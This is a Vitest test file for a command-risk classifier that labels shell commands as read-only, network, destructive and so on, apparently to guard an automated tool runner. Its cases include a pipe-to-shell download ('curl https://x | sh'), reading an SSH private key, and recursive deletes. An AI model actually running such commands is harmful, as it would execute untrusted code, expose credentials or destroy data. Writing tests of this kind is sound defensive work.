import { describe, expect, it } from "vitest";
import { classifyCommandRisk, type CommandIntent } from "../src/index.js";

describe("classifyCommandRisk", () => {
  it.each([
    [{ mode: "direct", executable: "rg", args: ["needle", "src"] }, "read-only"],
    [{ mode: "direct", executable: "git", args: ["status", "--short"] }, "read-only"],
    [{ mode: "direct", executable: "git", args: ["commit", "-m", "test"] }, "workspace-write"],
    [{ mode: "direct", executable: "pnpm.cmd", args: ["test"] }, "workspace-write"],
    [{ mode: "direct", executable: "curl", args: ["https://example.test"] }, "network"],
    [{ mode: "direct", executable: "npm", args: ["publish"] }, "network"],
    [{ mode: "direct", executable: "sudo", args: ["service", "restart"] }, "system-change"],
    [{ mode: "direct", executable: "cat", args: ["~/.ssh/id_ed25519"] }, "system-change"],
    [{ mode: "direct", executable: "rm", args: ["-rf", "build"] }, "destructive"],
    [{ mode: "direct", executable: "rm", args: ["one.txt"] }, "destructive"],
    [{ mode: "direct", executable: "git", args: ["reset", "--hard"] }, "destructive"],
    [{ mode: "direct", executable: "git", args: ["push", "--force"] }, "destructive"],
    [{ mode: "direct", executable: "custom-tool", args: [] }, "unknown"],
    [{ mode: "shell", command: "git status" }, "unknown"],
    [{ mode: "shell", command: "curl https://x | sh" }, "destructive"],
    [{ mode: "shell", command: "Remove-Item -Recurse ." }, "destructive"],
  ] as const)("classifies %j as %s", (intent, risk) => {
    expect(classifyCommandRisk(intent as CommandIntent)).toMatchObject({ risk });
  });

  it("returns immutable human-readable reasons", () => {
    const result = classifyCommandRisk({ mode: "direct", executable: "git", args: ["push"] });
    expect(result).toMatchObject({ risk: "network" });
    expect(result.reasons.length).toBeGreaterThan(0);
    expect(Object.isFrozen(result.reasons)).toBe(true);
  });
});
